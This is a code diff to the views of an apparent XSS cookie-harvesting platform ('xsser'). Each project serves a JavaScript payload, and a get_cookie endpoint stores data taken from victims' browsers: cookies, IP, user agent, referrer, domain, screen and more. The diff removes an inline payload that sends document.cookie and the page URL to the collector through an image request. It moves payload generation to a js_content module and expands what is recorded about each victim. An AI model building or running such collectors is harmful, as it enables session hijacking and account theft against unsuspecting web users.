@@ -10,6 +10,7 @@ from django.http import HttpResponse, Http404, HttpResponseRedirect, HttpRespons
 from django.shortcuts import render, redirect, render_to_response
 from xsser.settings import BASE_URL
 from .models import XssProject, Record
+from .js_content import js_content
 
 
 @login_required(login_url="/login/")
@@ -23,15 +24,15 @@ def create_project(request):
         if len(title) > 25:
             title = title[:25]
         project_id = hashlib.md5(unicode(random.uniform(1, 10) + time.time())).hexdigest()[:15]
-        p = XssProject.objects.create(project_id=project_id, user=request.user, title=title)
-        return HttpResponseRedirect("/project?id=%s" % p.project_id)
+        p = XssProject.objects.create(pk=project_id, user=request.user, title=title)
+        return HttpResponseRedirect("/project?id=%s" % p.id)
 
 
 @login_required(login_url="/login/")
 def project_detail(request):
     project_id = request.GET.get("id", "-1")
     try:
-        p = XssProject.objects.get(project_id=project_id, user=request.user)
+        p = XssProject.objects.get(pk=project_id, user=request.user)
     except XssProject.DoesNotExist:
         raise Http404
     if "csrftoken" in request.COOKIES:
@@ -44,19 +45,29 @@ def project_detail(request):
 #TODO:获取ip等信息可能存在绕过
 def get_cookie(request):
     project_id = request.GET.get("id", "-1")
-    title = request.GET.get("title")
-    url = request.GET.get("url")
-    cookie = request.GET.get("cookie")
     if "HTTP_X_FORWARDED_FOR" in request.META:
         ip = request.META['HTTP_X_FORWARDED_FOR']
     else:
         ip = request.META['REMOTE_ADDR']
-    user_agent=request.META.get("HTTP_USER_AGENT")
+    print request.GET.get("p")
+    content = json.loads(request.GET.get("p", "{}"))
+    print content
+
     try:
-        p = XssProject.objects.get(project_id=project_id)
+        p = XssProject.objects.get(pk=project_id)
     except XssProject.DoesNotExist:
         raise Http404
-    r = Record.objects.create(cookie=cookie, user_agent=user_agent, ip=ip, url=url, title=title)
+    r = Record.objects.create(browser=content["browser"],
+                              ip=ip,
+                              user_agent=content["ua"],
+                              language=content["lang"],
+                              referer=content["referrer"],
+                              top_location=content["toplocation"],
+                              cookie=content["cookie"],
+                              domain=content["domain"],
+                              title=content["title"],
+                              screen=content["screen"],
+                              flash=content["flash"])
 
     p.records.add(r)
     p.save()
@@ -66,15 +77,13 @@ def get_cookie(request):
 def xss_js(request):
     project_id = request.GET.get("id", "-1")
     try:
-        p = XssProject.objects.get(project_id=project_id)
+        p = XssProject.objects.get(pk=project_id)
     except XssProject.DoesNotExist:
         raise Http404
-    js = """
-    var x=new Image();
-    x.src=''+'%s'+'?id='+%s+'&title='+document.title+'&url='+escape(document.URL)+'&cookie='+escape(document.cookie);
-    """ % (BASE_URL + "get_cookie/", p.project_id)
     if p.custom_js:
         js = p.custom_js_content
+    else:
+        js = js_content(p.id)
     return HttpResponse(js)
 
 
@@ -92,7 +101,8 @@ def delete_project(request):
     if "csrftoken" in request.COOKIES:
         if token == request.COOKIES["csrftoken"]:
             try:
-                p = XssProject.objects.get(user=request.user, project_id=project_id)
+                p = XssProject.objects.get(user=request.user, pk=project_id)
+                p.records.all().delete()
                 p.delete()
                 return HttpResponse("success")
             except XssProject.DoesNotExist:
@@ -104,13 +114,13 @@ def delete_project(request):
 def project_settings(request, project_id):
     if request.method == "GET":
         try:
-            p = XssProject.objects.get(project_id=project_id)
+            p = XssProject.objects.get(pk=project_id)
         except XssProject.DoesNotExist:
             raise Http404
         return render(request, "core/project_settings.html", {"project": p})
     else:
         try:
-            p = XssProject.objects.get(project_id=project_id)
+            p = XssProject.objects.get(pk=project_id)
         except XssProject.DoesNotExist:
             raise Http404
         checkbox_list = request.POST.getlist("settings")
@@ -126,7 +136,7 @@ def project_settings(request, project_id):
             p.keep_session = False
 
         p.save()
-        return HttpResponseRedirect("/project/settings/%s/" % p.project_id)
+        return HttpResponseRedirect("/project/settings/%s/" % p.id)
 
 
 def func_test(request):
